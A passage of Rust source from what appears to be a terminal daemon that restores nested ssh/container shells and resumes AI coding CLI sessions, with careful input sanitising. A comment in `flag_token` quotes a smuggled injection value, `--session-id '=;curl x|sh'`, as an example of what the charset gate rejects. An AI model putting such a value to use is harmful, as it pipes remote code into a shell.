    // Same tokeniser as `nested_shell_cmd` — the two verdicts gate each
    // other at every call site, so they must never disagree about where the
    // words are (see `split_ws_quoted`).
    let owned = split_ws_quoted(cmd);
    let words: Vec<&str> = owned.iter().map(String::as_str).collect();
    // env-prefix-cli: skipped here for the same reason as in
    // `nested_shell_argv`, and it MUST be skipped in both or neither —
    // every caller evaluates the two together (`nested_shell_cmd(cmd) &&
    // crosses_to_posix(cmd)`), so a prefix only one of them saw would read
    // `FOO=1 ssh host` as an interactive nested shell that does not cross
    // into a POSIX world, and the hook injection would never arm.
    let argv = strip_env_prefix(&words).unwrap_or_default();
    let Some(first) = argv.first() else {
        return false;
    };
    let stem = cmd_stem(first);
    matches!(
        stem.as_str(),
        "ssh" | "wsl" | "docker" | "podman" | "kubectl" | "oc" | "distrobox" | "toolbox"
    )
}

/// How a nested-shell episode ended, as far as the daemon can HONESTLY tell.
///
/// The question matters because the two endings want opposite treatment: a
/// session the user closed must never be resurrected, and a session a dead
/// link took away is exactly what the user wants back.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum NestedEnd {
    /// The user left on purpose (`exit`, `logout`, Ctrl-D). Retire the
    /// breadcrumb — today's behaviour, unchanged.
    Deliberate,
    /// The transport failed under a session that was still in use. The
    /// breadcrumb is kept and the opener is replayed on a backoff ladder.
    Died,
    /// Not determinable on this path. Treated exactly like `Deliberate` for
    /// anything automatic — never resurrect on a guess — but the caller may
    /// still keep a manual affordance.
    Unknown,
}

/// Decide why a nested episode ended, from the opener that started it and the
/// exit status the OUTER shell reported for that opener.
///
/// `exit` is the `e` field of the token-checked `pre` that renders the outer
/// prompt again: the outer shell's status for the command that opened the
/// nested world. `None` means the family cannot report one at all — cmd.exe
/// is the permanent case (`bootstrap::cmd_prompt_value`: a `PROMPT` macro
/// cannot expand `%ERRORLEVEL%` at render time, so its pre payload is the
/// constant `{"e":null,"n":0}`; probe `cmd_hooks` pins it).
///
/// Only `ssh` is read as DIED, and only on its documented failure status:
///
/// > ssh exits with the exit status of the remote command, or 255 if an
/// > error occurred.
///
/// So 255 is "ssh itself could not keep the connection" — a dropped link,
/// a timed-out TCP session after a laptop sleep, a refused reconnect. Every
/// other status belongs to the remote side (`exit 3` in the remote shell
/// returns 3) and is therefore the user's own doing. Other crossing openers
/// (`wsl`, `docker exec`) are deliberately NOT given a death verdict: a
/// local container or distro going away is not a transport failure, and
/// re-entering it automatically is not what "my connection dropped" means.
///
/// `ladder_live` says a replay ladder is ALREADY climbing for this terminal,
/// and it loosens exactly one thing: a non-zero status that is not 255 also
/// reads as a death. That is not a guess, it is the PowerShell hook's own
/// documented behaviour. `bootstrap.rs`'s prompt wrapper trusts
/// `$LASTEXITCODE` only when the just-run pipeline CHANGED it, because the
/// variable persists across later cmdlets and would otherwise make every
/// cmdlet inherit the previous native command's code. The residual it names:
///
/// > a native command repeating the previous native code reads as
/// > "unchanged" and folds to `$?` (still correctly FAILED, only the exact
/// > code differs)
///
/// A replayed `ssh` failing the same way twice is precisely that case: the
/// first drop reports 255, the identical second one folds to 1. Without this
/// the ladder would stop after a single attempt against a host that is still
/// down — the exact situation it exists for. Exit 0 is still never a death,
/// in or out of a ladder, so a user who gets back in and then logs out
/// properly ends it.
///
/// Conservative by construction: the failure mode of this function is to
/// decline to resurrect, never to resurrect something the user closed. The
/// loosening needs a ladder that a strict 255 already started.
pub fn nested_end_verdict(
    opener: Option<&str>,
    exit: Option<i64>,
    ladder_live: bool,
) -> NestedEnd {
    let Some(opener) = opener else {
        return NestedEnd::Unknown;
    };
    let owned = split_ws_quoted(opener);
    let words: Vec<&str> = owned.iter().map(String::as_str).collect();
    let argv = strip_env_prefix(&words).unwrap_or_default();
    let Some(first) = argv.first() else {
        return NestedEnd::Unknown;
    };
    if cmd_stem(first) != "ssh" {
        // Not a transport we know how to judge; ending is just ending.
        return match exit {
            Some(_) => NestedEnd::Deliberate,
            None => NestedEnd::Unknown,
        };
    }
    match exit {
        // A clean logout is the user's doing, always — a live ladder does
        // not change that, it ends it.
        Some(0) => NestedEnd::Deliberate,
        Some(255) => NestedEnd::Died,
        // See the `$LASTEXITCODE` note above: an identical repeat folds to 1,
        // so mid-ladder any failure continues the ladder.
        Some(_) if ladder_live => NestedEnd::Died,
        Some(_) => NestedEnd::Deliberate,
        // cmd.exe: exit codes are permanently unavailable (D7). We know the
        // ssh ended; we cannot know why. Never auto-replay on that.
        None => NestedEnd::Unknown,
    }
}

/// F1: is `key` an enabled CLI adapter? Gates the nested-beacon mint — a
/// beacon may CREATE cli state there (no exec hook can precede it inside a
/// nested shell), so the adapter slot must at least name a tool the
/// registry knows.
pub fn known_adapter(key: &str) -> bool {
    ADAPTERS.iter().any(|a| a.enabled && a.key == key)
}

/// Cap on recorded breadcrumb commands — a re-establish line is a hint, not
/// a transcript. Beyond this the chain stops growing (first links win: the
/// opener and the early hops are the load-bearing part).
pub const NESTED_CHAIN_MAX: usize = 8;

/// F1 spec I1, factored so the invariant is testable as a table: may this
/// identity feed a restore's AUTO-RESUME composition? Only a confident,
/// NON-nested identity ever may — a nested one is display/preface-only (the
/// resume would run as the ssh login user against the nested account's
/// session store: structurally the wrong store, and the failure used to
/// consume the identity).
pub fn cli_wants_resume(cli: &InnerCli) -> bool {
    !cli.nested
        && matches!(
            cli.confidence,
            CliConfidence::Explicit | CliConfidence::Correlated
        )
}

/// Char-safe display truncation: first `max` chars, with `…` marking a cut.
fn truncate_chars(s: &str, max: usize) -> String {
    if s.chars().count() <= max {
        return s.to_string();
    }
    let mut out: String = s.chars().take(max).collect();
    out.push('…');
    out
}

/// F1 preface composition (spec §4.3, golden-tested byte-exact): the honest,
/// copy-pasteable re-establish line a restore prints INSTEAD of
/// auto-resuming into a privilege boundary. `cli` is the nested-tagged
/// identity when a beacon attributed one (callers filter on `nested`).
///
/// Variants:
/// - A (identity + beacon-witnessed cwd): chain; `cd '<cwd>'`; resume.
/// - B (identity, no witnessed cwd — or an over-long one): chain; resume;
///   "(run it from the conversation's directory)".
/// - C (no identity / no token / unsafe token): chain only, manual hint.
///
/// Escaping choke points: the token prints only when `safe_resume_token`
/// passes (r3-S1 — same charset gate every restore shares; unsafe ⇒ C, never
/// a mangled command); the cd path comes ONLY from the beacon-witnessed
/// `chain.cli_cwd`, single-quoted via `bootstrap::sh_single_quote`, and is
/// dropped (⇒ B) when its quoted form exceeds 120 display chars; recorded
/// commands are relayed as display text with control bytes stripped (no
/// terminal-sequence smuggling into the preface), joined and truncated
/// char-safe at 100 chars.
///
/// F2 (`auto` = the launch armed the chain re-establish): the line says the
/// chain is being re-typed automatically instead of asking for it — but the
/// inner-CLI half keeps the manual resume hint verbatim. The pre-F2 wording
/// is preserved byte-exact for `auto = false` (opt-out / hookless spawns).
///
/// F3 (nested-cli-resume): `auto_resume_step` is the composed final step
/// (`nested_resume_step`) when the FULL sequence — chain re-type + inner-CLI
/// resume — will actually run. Only then does the line promise the resume;
/// the exact command stays inline so an aborted sequence (credential prompt,
/// timeout, user keystroke) still leaves the copy-pasteable hint on screen —
/// preface lines cannot be appended mid-session for already-attached
/// clients, so the promise and the fallback ride the same line. Every other
/// case keeps the honest manual wording byte-exact.
pub fn nested_restore_notice(
    chain: &NestedChain,
    cli: Option<&InnerCli>,
    auto: bool,
    auto_resume_step: Option<&NestedFinalStep>,
) -> String {
    let joined = chain
        .cmds
        .iter()
        .map(|s| sanitize_display_cmd(s))
        .filter(|s| !s.is_empty())
        .collect::<Vec<_>>()
        .join("; ");
    let c = if joined.is_empty() {
        "nested shell".to_string()
    } else {
        truncate_chars(&joined, 100)
    };
    // env-prefix-cli: a step that REPLAYS a witnessed launch line may name
    // no session at all (`IS_SANDBOX=1 claude --dangerously-skip-permissions`
    // — the user picks his conversation with `/resume` inside the TUI).
    // That is a re-LAUNCH, and the notice says exactly that; the
    // pre-existing "resuming its <a> session" wording below is kept
    // byte-exact for the steps that really do name one.
    if auto {
        if let Some(step) = auto_resume_step.filter(|s| !s.resumes) {
            let a = cli.map_or("the CLI", |c| c.adapter.as_str());
            let cmd = &step.cmd;
            return format!(
                "── re-establishing this terminal's nested shell ({c}) and re-launching {a} automatically — if it stops: {cmd} ──"
            );
        }
    }
    let identity = cli.and_then(|cli| {
        let t = cli.resume_token.as_deref()?;
        safe_resume_token(t).then(|| (cli.adapter.clone(), t.to_string()))
    });
    let Some((a, t)) = identity else {
        // Variant C.
        return if auto {
            format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; anything that ran inside it was not restored ──"
            )
        } else {
            format!(
                "── this terminal had a nested shell ({c}); anything running inside it was not restored — re-establish it manually ──"
            )
        };
    };
    let quoted_cd = chain
        .cli_cwd
        .as_ref()
        .map(|p| super::bootstrap::sh_single_quote(&p.to_string_lossy()))
        .filter(|q| q.chars().count() <= 120);
    if auto {
        if let Some(step) = auto_resume_step {
            // F3 full-sequence variant: the chain types itself AND the
            // inner CLI resumes as the final step (nested-cli-resume). The
            // exact command doubles as the abort fallback (doc above).
            let cmd = &step.cmd;
            return format!(
                "── re-establishing this terminal's nested shell ({c}) and resuming its {a} session automatically — if it stops: {cmd} ──"
            );
        }
        return match quoted_cd {
            // Auto variant A: the chain types itself; the resume stays manual.
            Some(q) => format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; its {a} session was not auto-resumed — resume: cd {q}; {a} --resume {t} ──"
            ),
            // Auto variant B.
            None => format!(
                "── re-establishing this terminal's nested shell ({c}) automatically; its {a} session was not auto-resumed — resume: {a} --resume {t} (run it from the conversation's directory) ──"
            ),
        };
    }
    match quoted_cd {
        // Variant A.
        Some(q) => format!(
            "── this terminal had a nested shell ({c}); its {a} session was not auto-resumed — re-establish: {c}; cd {q}; {a} --resume {t} ──"
        ),
        // Variant B.
        None => format!(
            "── this terminal had a nested shell ({c}); its {a} session was not auto-resumed — re-establish: {c}; {a} --resume {t} (run it from the conversation's directory) ──"
        ),
    }
}

/// env-prefix-cli: what the re-establish engine will type as its FINAL
/// step, and whether that step re-enters a SPECIFIC session (`--resume
/// <sid>`) or merely re-launches the CLI the way the user launched it. The
/// preface and the abort hint must say which — a bare re-launch announced
/// as "resuming its claude session" would be a lie, and this lane's whole
/// doctrine is that a restore never claims more than it did.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct NestedFinalStep {
    /// The exact command line typed into the re-established nested shell.
    pub cmd: String,
    /// The step names a session: a composed `--resume <token>`, or a
    /// witnessed line that carried one of its own.
    pub resumes: bool,
}

/// Cap on a replayed launch line. A replay is ONE command the user ran, not
/// a transcript; past this the composed resume stays the fallback.
const REPLAY_LINE_MAX: usize = 300;

/// env-prefix-cli: normalise a hook-witnessed exec line into the launch line
/// worth replaying — or refuse it.
///
///  - the `cd '<dir>' &&` head is stripped (`cd_head_tail`): this lane types
///    that head ITSELF, and the nested shell's hooks witness the whole
///    composed line straight back, so without the strip the recorded line
///    would grow one more `cd '<dir>' &&` on every reconnect;
///  - CONTROL BYTES ARE FATAL, not stripped. This string is written to the
///    PTY followed by `\r` (`reestablish::type_reestablish_line`), so an
///    embedded CR/LF would submit a second command line of its own. The
///    display lane can afford `sanitize_display_cmd`; a TYPING lane cannot;
///  - empty or over-long ⇒ None.
pub fn witnessed_launch_line(cmd: &str) -> Option<String> {
    let line = cd_head_tail(cmd).map_or(cmd, |(_, tail)| tail).trim();
    if line.is_empty()
        || line.chars().count() > REPLAY_LINE_MAX
        || line.chars().any(|c| c.is_control())
    {
        return None;
    }
    Some(line.to_string())
}

/// env-prefix-cli: the resume SUFFIX that may be APPENDED to a witnessed
/// launch line — `--resume <sid>` for claude — derived from the adapter's
/// own `restore` trailing, so there is ONE source of truth for what a resume
/// looks like and the r3-S1 charset gate inside `restore_trailing` runs on
/// the token exactly as it does for every other restore.
///
/// Three things must hold, else None:
///  - the trailing must begin with the adapter's own name followed by a
///    SPACE. `cursor-agent --resume <id>` under the key `cursor` is not this
///    adapter's literal name and must never be sliced apart;
///  - the remainder must be a FLAG, not a SUBCOMMAND. `codex resume <id>`,
///    `goose session --resume <EM>` and `amp threads continue <id>` all put a
///    subcommand first, so appending them builds a line that does not parse
///    ⇒ those adapters replay bare, which is still the honest outcome;
///  - the remainder must actually CARRY the token. `aider
///    --restore-chat-history` and `gemini --resume` re-enter "the last
///    conversation", not a NAMED one ⇒ appending them would let the notice
///    claim a session it is not actually re-entering.
fn appendable_resume_suffix(adapter: &str, token: &str) -> Option<String> {
    let full = restore_trailing(adapter, Some(token))?;
    let suffix = full.strip_prefix(adapter)?.strip_prefix(' ')?;
    (suffix.starts_with('-') && suffix.contains(token)).then(|| suffix.to_string())
}

/// env-prefix-cli: is this witnessed line a SIMPLE command, i.e. is its end
/// also the end of the CLI's own argv? A shell operator anywhere — a pipe,
/// a chain, a redirect, a substitution, a comment — means it is not, and an
/// appended `--resume <sid>` would land on `tee`, on whatever the chain runs
/// next, or inside a comment. Only the APPEND needs this gate: replaying the
/// line bare is what the user ran, operators and all.
fn appendable_line(line: &str) -> bool {
    !line.contains(['|', '&', ';', '<', '>', '(', ')', '$', '`', '#'])
}

/// Nested-cli-resume: the final auto-typed re-establish step, TYPED by the
/// engine strictly after the chain's last command confirmed (reestablish.rs
/// Done edge), so it always executes INSIDE the re-established nested shell
/// — the original spec-I1 concern (resuming against the login user's
/// session store) is resolved by that ordering, not by refusing the resume.
/// The launch-time restore arms keep refusing nested identities
/// (`cli_wants_resume`) for exactly that reason.
///
/// env-prefix-cli — WHAT gets typed, in priority order:
///
///  1. the WITNESSED launch line, replayed VERBATIM (`chain.launch_cmd`):
///     `cd '<cli_cwd>' && IS_SANDBOX=1 claude --dangerously-skip-permissions`.
///     This is the honest replay — it re-runs exactly what the user ran,
///     env prefix and flags intact. Composing a resume instead DROPPED both
///     (and `IS_SANDBOX=1` / `--dangerously-skip-permissions` ARE the
///     security posture of the thing being started, never ours to change
///     silently) while naming a session id the user may never have asked
///     for: after an in-TUI `/resume` the argv id is stale — `analyze`
///     says so a few hundred lines up — and the pid-registry correction
///     that repairs that locally cannot reach a remote host. A witnessed
///     line that DOES carry `--resume <sid>` replays as a resume for free,
///     which is the point.
///  2. otherwise the COMPOSED `<adapter> --resume <token>`, byte-identical
///     to before: a concrete token through the shared r3-S1 charset gate
///     (`restore_trailing`). This is now the NO-WITNESS fallback — a v2
///     beacon identity with no exec hook inside the nested shell.
///
/// THE APPEND (the case between 1 and 2): a replayed line that names no
/// session may still carry ` --resume <sid>` APPENDED to it — added to the
/// user's line, never in place of it, so his env prefix and every flag ride
/// along. That is what keeps v0.1.13's nested auto-resume alive through the
/// replay. FOUR gates, all required, and any one short falls back to the
/// bare replay of 1, honestly labelled a re-launch: (a) PROVENANCE,
/// `cli.token_self_reported` — only the CLI's OWN report of the session it
/// is currently in (pid registry, SessionStart hook, tcbeacon) qualifies,
/// never an argv id, for the staleness reason above; (b) the line must not
/// already name a session, judged by the adapter's own extractor (the
/// `re.resume_token` branch), so no line can carry the flag twice; (c) the
/// adapter's resume must be an appendable flag that carries the token
/// (`appendable_resume_suffix`); (d) the line must be a simple command
/// (`appendable_line`).
///
/// Both need the hook/beacon-witnessed `chain.cli_cwd` (single-quoted via
/// `bootstrap::sh_single_quote`). Any half missing ⇒ None: never guess a
/// session, never guess a directory, and never replay a line that no longer
/// classifies as THIS identity's adapter (`analyze_cmdline` re-run over it
/// is the same concrete-witness re-check `remote_probe` makes of a recorded
/// command).
pub fn nested_resume_step(chain: &NestedChain, cli: Option<&InnerCli>) -> Option<NestedFinalStep> {
    let cli = cli?;
    if !cli.nested {
        return None; // the non-nested lane has its own restore trailing
    }
    let cwd = chain.cli_cwd.as_ref()?;
    let q = super::bootstrap::sh_single_quote(&cwd.to_string_lossy());
    // 1. The witnessed launch line — re-gated on the way OUT of state.json
    //    (the hostile-config threat model applies to every field it carries)
    //    and re-classified: it must still name THIS identity's adapter, or
    //    it is not evidence about this CLI.
    if let Some(line) = chain.launch_cmd.as_deref().and_then(witnessed_launch_line) {
        if let Some(re) = analyze_cmdline(&line, cwd).filter(|re| re.adapter == cli.adapter) {
            // (b) The line ALREADY names a session — replay it untouched.
            // The check is the adapter's own extractor, not a search for the
            // string "--resume", so every shape it knows (`--resume=<id>`,
            // `--session-id`, a resume subcommand) counts and no line can
            // end up carrying the flag twice.
            if re.resume_token.is_some() {
                return Some(NestedFinalStep {
                    cmd: format!("cd {q} && {line}"),
                    resumes: true,
                });
            }
            // (a) + (c) A bare launch whose identity is TRUSTWORTHY — the
            // CLI's own self-report, never argv — gets the resume appended
            // to the user's line rather than replacing it: v0.1.13's
            // auto-resume survives, and the env prefix and every flag he
            // typed survive with it. An argv-derived id is deliberately not
            // enough (stale after an in-TUI `/resume`, with no remote
            // correction), and the adapter must have an appendable resume
            // flag on a line simple enough to append to.
            if cli.token_self_reported && appendable_line(&line) {
                if let Some(suffix) = cli
                    .resume_token
                    .as_deref()
                    .and_then(|t| appendable_resume_suffix(&cli.adapter, t))
                {
                    return Some(NestedFinalStep {
                        cmd: format!("cd {q} && {line} {suffix}"),
                        resumes: true,
                    });
                }
            }
            return Some(NestedFinalStep {
                cmd: format!("cd {q} && {line}"),
                resumes: false,
            });
        }
    }
    // 2. No witnessed line: compose from a concrete token, exactly as before.
    let token = cli.resume_token.as_deref()?;
    let resume = restore_trailing(&cli.adapter, Some(token))?;
    Some(NestedFinalStep {
        cmd: format!("cd {q} && {resume}"),
        resumes: true,
    })
}

/// Nested-cli-resume: the hint pushed when an armed FULL sequence stops
/// before its resume step ran (credential prompt / timeout / user keystroke
/// / collapsed chain) — the resume command the notice used to carry, as a
/// standalone preface line. Golden-tested.
pub fn nested_resume_abort_hint(adapter: &str, step: &NestedFinalStep) -> String {
    let cmd = &step.cmd;
    if step.resumes {
        format!("── {adapter} session was not auto-resumed — resume: {cmd} ──")
    } else {
        // env-prefix-cli: a verbatim replay of a launch that named no
        // session did not resume anything — say what it actually was.
        format!("── {adapter} was not re-launched — run it: {cmd} ──")
    }
}

/// Nested-cli-resume (regression fix, hypothesis c): how a hook-witnessed
/// nested-shell opener updates the breadcrumb. Pre-fix the daemon REPLACED
/// the chain unconditionally, which destroyed `cli_cwd` (and truncated
/// multi-hop chains to their opener) every re-establish cycle — the
/// auto-typed `sudo su` re-recorded a bare chain and the resume identity
/// was gone. Rule: re-witnessing the SAME opener (typically our own
/// auto-typed step 1, or the user re-entering their chain) PRESERVES the
/// recorded chain — deeper hops and the beacon-witnessed `cli_cwd` are
/// still the truth of the world being rebuilt — refreshing only
/// `entered_cwd`/`opened_ms`. A DIFFERENT opener replaces it (the newest
/// witnessed chain wins, exactly as before).
pub fn reopen_nested_chain(
    prior: Option<NestedChain>,
    cmd: &str,
    entered_cwd: &Path,
    now_ms: u64,
) -> NestedChain {
    let cmd = cmd.trim();
    match prior {
        Some(mut chain) if chain.cmds.first().is_some_and(|c| c == cmd) => {
            chain.entered_cwd = entered_cwd.to_path_buf();
            chain.opened_ms = now_ms;
            chain
        }
        _ => NestedChain {
            cmds: vec![cmd.to_string()],
            entered_cwd: entered_cwd.to_path_buf(),
            cli_cwd: None,
            opened_ms: now_ms,
            // env-prefix-cli: a DIFFERENT opener is a different world — the
            // launch witnessed in the old one says nothing about this one.
            launch_cmd: None,
        },
    }
}

/// Strip control bytes from a user-typed command destined for display text
/// (preface). Keeps everything printable verbatim.
fn sanitize_display_cmd(s: &str) -> String {
    s.chars()
        .filter(|c| !c.is_control())
        .collect::<String>()
        .trim()
        .to_string()
}

/// F1 spec §2.4: append a D2-lane nested-shell spawn to the breadcrumb.
/// Pure so the cap+dedupe table is unit-testable: consecutive duplicates
/// collapse (a retried `sudo su` is one hop), the chain never exceeds
/// `NESTED_CHAIN_MAX`. Returns whether the chain changed.
pub fn append_nested_cmd(cmds: &mut Vec<String>, cmd: &str) -> bool {
    let cmd = cmd.trim();
    if cmd.is_empty() || cmds.len() >= NESTED_CHAIN_MAX {
        return false;
    }
    if cmds.last().is_some_and(|last| last == cmd) {
        return false;
    }
    cmds.push(cmd.to_string());
    true
}

/// Naive quote-aware whitespace split (P6 §7.2): single quotes literal,
/// double quotes grouping, backslash escapes the next char outside single
/// quotes. Good enough for adapter argv shapes; a shell-perfect parse is
/// explicitly out of scope (the adapters only read flags and UUID tokens).
fn split_cmdline(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = cmd.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            c if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            '\'' => {
                in_word = true;
                for c in chars.by_ref() {
                    if c == '\'' {
                        break;
                    }
                    cur.push(c);
                }
            }
            '"' => {
                in_word = true;
                while let Some(c) = chars.next() {
                    match c {
                        '"' => break,
                        '\\' => {
                            if let Some(n) = chars.next() {
                                if n != '"' && n != '\\' {
                                    cur.push('\\');
                                }
                                cur.push(n);
                            }
                        }
                        c => cur.push(c),
                    }
                }
            }
            '\\' => {
                in_word = true;
                if let Some(n) = chars.next() {
                    cur.push(n);
                }
            }
            c => {
                in_word = true;
                cur.push(c);
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

/// Parse a claude command line for an explicit session id.
pub fn parse_claude_session(argv: &[String]) -> Option<Uuid> {
    let mut it = argv.iter();
    while let Some(arg) = it.next() {
        for pfx in ["--resume=", "--session-id="] {
            if let Some(v) = arg.strip_prefix(pfx) {
                if let Ok(u) = Uuid::parse_str(v.trim_matches('"')) {
                    return Some(u);
                }
            }
        }
        if arg == "--resume" || arg == "--session-id" {
            if let Some(v) = it.next() {
                if let Ok(u) = Uuid::parse_str(v.trim_matches('"')) {
                    return Some(u);
                }
            }
        }
    }
    None
}

fn filetime_to_systemtime(ft: u64) -> SystemTime {
    // FILETIME: 100ns ticks since 1601-01-01; Unix epoch is 11644473600s later.
    const EPOCH_DIFF_SECS: u64 = 11_644_473_600;
    let secs = ft / 10_000_000;
    if secs < EPOCH_DIFF_SECS {
        return SystemTime::UNIX_EPOCH;
    }
    SystemTime::UNIX_EPOCH + Duration::from_secs(secs - EPOCH_DIFF_SECS)
}

fn abs_diff(a: SystemTime, b: SystemTime) -> Duration {
    a.duration_since(b).unwrap_or_else(|_| b.duration_since(a).unwrap_or_default())
}

/// Wake-time re-pin evidence for a PINNED-id claude terminal: did the
/// previous run rotate its session id under the pin (fork-on-resume /
/// `/clear`)? Rules — abstain everywhere short of certainty:
/// - the PINNED transcript was written during the run window ⇒ the pin is
///   the live conversation, keep it (None);
/// - otherwise, EXACTLY ONE session jsonl in the project dir was BORN
///   inside the run window ⇒ that is this terminal's conversation (Some);
/// - zero or ≥2 candidates ⇒ None (wrong-session resume is worse than a
///   fresh session — the Ambiguous doctrine).
///
/// `spawn_ms`/`end_ms` are wall-clock ms of the previous process's life
/// (Core::spawn_times); WINDOW_SLACK absorbs clock/flush skew.
pub fn claude_repin_candidate(
    cwd: &Path,
    pinned: Uuid,
    spawn_ms: u64,
    end_ms: u64,
) -> Option<Uuid> {
    let dir = crate::state::claude_session_file(cwd, &pinned)?
        .parent()?
        .to_path_buf();
    claude_repin_candidate_in(&dir, pinned, spawn_ms, end_ms)
}

/// Testable core of `claude_repin_candidate` (injected project dir).
pub fn claude_repin_candidate_in(
    dir: &Path,
    pinned: Uuid,
    spawn_ms: u64,
    end_ms: u64,
) -> Option<Uuid> {
    const WINDOW_SLACK: Duration = Duration::from_secs(5);
    let ms = |t: SystemTime| {
        t.duration_since(SystemTime::UNIX_EPOCH)
            .map(|d| d.as_millis() as u64)
            .unwrap_or(0)
    };
    let lo = spawn_ms.saturating_sub(WINDOW_SLACK.as_millis() as u64);
    let hi = end_ms.saturating_add(WINDOW_SLACK.as_millis() as u64);
    let mut born_in_window: Vec<Uuid> = Vec::new();
    let rd = std::fs::read_dir(dir).ok()?;
    for entry in rd.flatten() {
        let path = entry.path();
        if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
            continue;
        }
        let Some(uid) = path
            .file_stem()
            .and_then(|s| s.to_str())
            .and_then(|s| Uuid::parse_str(s).ok())
        else {
            continue;
        };
        let Ok(meta) = entry.metadata() else { continue };
        if uid == pinned {
            // The pin is alive: its transcript moved during the run.
            let mtime = meta.modified().map(ms).unwrap_or(0);
            if mtime >= lo {
                return None;
            }
            continue;
        }
        let born = meta.created().map(ms).unwrap_or(0);
        if born >= lo && born <= hi {
            born_in_window.push(uid);
        }
    }
    match born_in_window.as_slice() {
        [one] => Some(*one),
        _ => None,
    }
}

/// Claude adapter: explicit id from argv, else correlate journals by birth time
/// near the process start, else newest mtime. Genuine ties → Ambiguous.
fn claude_extract(
    argv: &[String],
    cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    if let Some(id) = parse_claude_session(argv) {
        return (Some(id.to_string()), CliConfidence::Explicit);
    }
    let Some(home) = dirs::home_dir() else {
        return (None, CliConfidence::Ambiguous);
    };
    let dir = home
        .join(".claude")
        .join("projects")
        .join(claude_project_dir_name(cwd));

    // (uuid, birth, mtime) for each session journal.
    let mut cands: Vec<(Uuid, Option<SystemTime>, SystemTime)> = Vec::new();
    if let Ok(rd) = std::fs::read_dir(&dir) {
        for entry in rd.flatten() {
            let path = entry.path();
            if path.extension().and_then(|e| e.to_str()) != Some("jsonl") {
                continue;
            }
            let Some(uid) = path
                .file_stem()
                .and_then(|s| s.to_str())
                .and_then(|s| Uuid::parse_str(s).ok())
            else {
                continue;
            };
            let Ok(meta) = entry.metadata() else { continue };
            let birth = meta.created().ok();
            let mtime = meta.modified().unwrap_or(SystemTime::UNIX_EPOCH);
            cands.push((uid, birth, mtime));
        }
    }
    if cands.is_empty() {
        return (None, CliConfidence::Ambiguous);
    }

    // Prefer a journal born within BIRTH_WINDOW of the process starting.
    if let Some(start) = start_ft.map(filetime_to_systemtime) {
        let near: Vec<Uuid> = cands
            .iter()
            .filter(|(_, birth, _)| {
                birth.is_some_and(|b| abs_diff(b, start) <= BIRTH_WINDOW)
            })
            .map(|(u, _, _)| *u)
            .collect();
        if near.len() == 1 {
            return (Some(near[0].to_string()), CliConfidence::Correlated);
        }
        if near.len() >= 2 {
            return (None, CliConfidence::Ambiguous);
        }
    }

    // Fall back to the most-recently-written journal (the active session).
    cands.sort_by_key(|c| std::cmp::Reverse(c.2));
    if cands.len() == 1 {
        return (Some(cands[0].0.to_string()), CliConfidence::Correlated);
    }
    let gap = abs_diff(cands[0].2, cands[1].2);
    if gap < MTIME_TIE_GAP {
        return (None, CliConfidence::Ambiguous);
    }
    (Some(cands[0].0.to_string()), CliConfidence::Correlated)
}

/// (stem, birth, mtime) for entries under `dir`: files with extension `ext`,
/// or directories when `ext` is None, descending `depth` intermediate levels
/// (codex nests sessions as YYYY/MM/DD/, qwen as <project>/chats/).
fn session_entries(
    dir: &Path,
    ext: Option<&str>,
    depth: u8,
) -> Vec<(String, Option<SystemTime>, SystemTime)> {
    let mut out = Vec::new();
    let Ok(rd) = std::fs::read_dir(dir) else {
        return out;
    };
    for e in rd.flatten() {
        let path = e.path();
        let is_dir = path.is_dir();
        match ext {
            Some(x) => {
                if is_dir {
                    if depth > 0 {
                        out.extend(session_entries(&path, ext, depth - 1));
                    }
                    continue;
                }
                if path.extension().and_then(|s| s.to_str()) != Some(x) {
                    continue;
                }
            }
            None => {
                if !is_dir {
                    continue;
                }
            }
        }
        let Some(stem) = path.file_stem().and_then(|s| s.to_str()).map(String::from) else {
            continue;
        };
        let Ok(meta) = e.metadata() else { continue };
        out.push((
            stem,
            meta.created().ok(),
            meta.modified().unwrap_or(SystemTime::UNIX_EPOCH),
        ));
    }
    out
}

/// A UNIQUE entry born within BIRTH_WINDOW of the process start → Correlated. Anything
/// else (no start time, zero or multiple candidates) → Ambiguous. Used for
/// stores that are global across terminals, where mtime-newest could belong to
/// a different session and must not be trusted.
fn birth_correlate(
    entries: &[(String, Option<SystemTime>, SystemTime)],
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    let Some(start) = start_ft.map(filetime_to_systemtime) else {
        return (None, CliConfidence::Ambiguous);
    };
    let near: Vec<&str> = entries
        .iter()
        .filter(|(_, birth, _)| {
            birth.is_some_and(|b| abs_diff(b, start) <= BIRTH_WINDOW)
        })
        .map(|(s, _, _)| s.as_str())
        .collect();
    match near.len() {
        1 => (Some(near[0].to_string()), CliConfidence::Correlated),
        _ => (None, CliConfidence::Ambiguous),
    }
}

/// Flag value that is a real resume token: not another flag (missing-value
/// guard) and strictly charset-valid (r3-S1 — this is the capture choke
/// point for every adapter without its own UUID validation; a hostile value
/// like `--session-id '=;curl x|sh'` must die here, years before a restore
/// would splice it unquoted into a shell).
fn flag_token(argv: &[String], flags: &[&str]) -> Option<String> {
    argv_flag_value(argv, flags).filter(|v| safe_resume_token(v))
}

/// The trailing 36 chars of `s` parsed as a UUID (codex rollout stems are
/// `rollout-<timestamp>-<uuid>`). Shared with the remote store descriptors
/// (remote_probe's codex token_of).
pub(crate) fn trailing_uuid(s: &str) -> Option<String> {
    if s.len() < 36 {
        return None;
    }
    let tail = &s[s.len() - 36..];
    Uuid::parse_str(tail).ok().map(|u| u.to_string())
}

fn codex_extract(
    argv: &[String],
    _cwd: &Path,
    start_ft: Option<u64>,
) -> (Option<String>, CliConfidence) {
    // `codex resume <UUID>` / `codex exec resume <UUID>` (never captures
    // `resume --last`: the UUID parse rejects it).
    for seq in [&["resume"][..], &["exec", "resume"][..]] {
        if let Some(tok) = argv_after_subcommand(argv, seq) {
            if Uuid::parse_str(&tok).is_ok() {
                return (Some(tok), CliConfidence::Explicit);
            }
        }
    }
    // `-c experimental_resume=<path-to-rollout-…-<uuid>.jsonl>`
